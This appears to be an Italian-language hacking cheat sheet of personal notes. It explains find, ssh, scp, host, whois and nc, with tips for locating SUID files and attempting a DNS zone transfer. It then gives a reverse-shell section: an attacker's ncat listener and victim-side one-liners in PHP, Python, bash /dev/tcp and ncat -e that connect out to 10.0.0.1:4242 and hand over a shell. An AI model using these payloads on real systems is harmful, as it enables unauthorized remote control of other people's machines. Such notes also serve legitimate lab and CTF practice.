# LISTA COMANDI UTILI
`find`: è il comando usato per trovare un file seguendo certi criteri
	- `find /`: inizia a cercare da root
	- `-user user1`: cerca file creato da utente user1
	- `-group group1`: cerca file creato da gruppo group1
	- `-size +6c -size -10c`: cerca file con dimensione maggiore di 6byte e minori di 10 byte
	- `-perm 4000`: cerca file con permessi utente root, se 2000 file avviato con privilegi del gruppo invece, che potrebbe essere root

`ssh`: è il comando per potersi collegare ad un computer in remoto
	- `ssh username@hostname`: connettiti ad IP = hostname usando username per credenziale d'accesso
	- `-p 2020`: utilizza la porta 2020 per la connessione

`scp`: è il comando per trasferire file usando ssh
	- `scp username@hostname:/percorso/origine /percorso/destinazione/nome_file_di_destinazione`: prendi file dalla connessione ssh e salvalo in locale con nome nome_file_di_destinazione
	- `-r`: copia una intera directory

`host`: è il comando utilizzato per eseguire query DNS e ottenere informazioni sui nomi di dominio.
	- **`-t ns`**: specifica il tipo di record DNS che desideri ottenere. In questo caso, "ns" sta per "nameserver", quindi stai chiedendo di ottenere informazioni sui server dei nomi del dominio
	- **`-t mx`**: specifica il tipo di record DNS richiesto, in questo caso, "mx" per i record di scambio di posta (Mail Exchange)
	- `-l hostname.com nsztm2.digi.ninja`: prova un DNS Zone Transfer, utile per altre informazioni

`whois`: è il comando per vedere informazioni sul possesso di un dominio o di un indirizzo IP. Potrebbe interessarti il "Name Server" per DNS Zone Transfer
	`whois esempio.com`: vedi le informazioni di esempio.com

`nc`: utile per creare client/server rapidamente. Ottimo per mandare i comandi alla macchina che stiamo attaccando
	- `nc -l 1234`: inizia ad ascoltare nella porta 1234
	- `nc 127.0.0.1 1234`: connettiti alla macchina con indirizzo 127.0.0.1 alla porta 1234


#SHELLS
###Reverse shell
Nella reverse shell è l'attacker che si mette in listening e la vittima si collega, quindi
ATTACCANTE:

```
ncat -lvnp 4242
```

VITTIMA:

#php
```php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("sh <&3 >&3 2>&3");'```

#python3
```python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'```

#bash

```bash -i >& /dev/tcp/10.0.0.1/4242 0>&1```

```0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196```

```/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1```

#netcat
```ncat 10.0.0.1 4242 -e /bin/bash```


